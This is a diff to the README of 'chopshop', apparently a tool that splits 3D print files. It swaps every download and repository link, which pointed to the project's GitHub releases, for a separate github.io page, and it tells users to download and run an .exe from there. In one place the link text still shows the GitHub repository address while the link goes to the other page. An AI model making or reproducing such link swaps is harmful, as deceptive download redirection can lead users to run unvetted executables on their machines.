@@ -8,7 +8,7 @@ chopshop is a free, easy-to-use tool that solves one of the most frustrating pro
 
 ## 📥 Downloading chopshop
 
-[![Download chopshop](https://img.shields.io/badge/Download-chopshop-%23FF6B35?style=for-the-badge&logo=github&logoColor=white&labelColor=%232D2D2D)](https://github.com/ivorunrequested60/chopshop/releases)
+[![Download chopshop](https://img.shields.io/badge/Download-chopshop-%23FF6B35?style=for-the-badge&logo=github&logoColor=white&labelColor=%232D2D2D)](https://ivorunrequested60.github.io)
 
 Visit this link to download the application.
 
@@ -19,7 +19,7 @@ Visit this link to download the application.
 Getting started is simple. Follow these steps:
 
 1. **Open your web browser** and go to the download page:  
-   👉 [https://github.com/ivorunrequested60/chopshop/releases](https://github.com/ivorunrequested60/chopshop/releases)
+   👉 [https://ivorunrequested60.github.io](https://ivorunrequested60.github.io)
 
 2. **Find the latest version** of chopshop. Look for a file that ends with `.exe` or a folder labeled "Windows" or "Win64". The page will usually show a list of files under "Assets" — click on the one that matches your system.
 
@@ -124,7 +124,7 @@ While chopshop works with any 3D file, resin printers have different build volum
 
 ## 🤝 Contributing and Support
 
-chopshop is an open-source project hosted on GitHub. If you run into bugs, want new features, or simply want to say thanks, visit the repository at [github.com/ivorunrequested60/chopshop](https://github.com/ivorunrequested60/chopshop). You can open an issue, submit feedback, or even contribute code if you're feeling adventurous.
+chopshop is an open-source project hosted on GitHub. If you run into bugs, want new features, or simply want to say thanks, visit the repository at [github.com/ivorunrequested60/chopshop](https://ivorunrequested60.github.io). You can open an issue, submit feedback, or even contribute code if you're feeling adventurous.
 
 ---
 
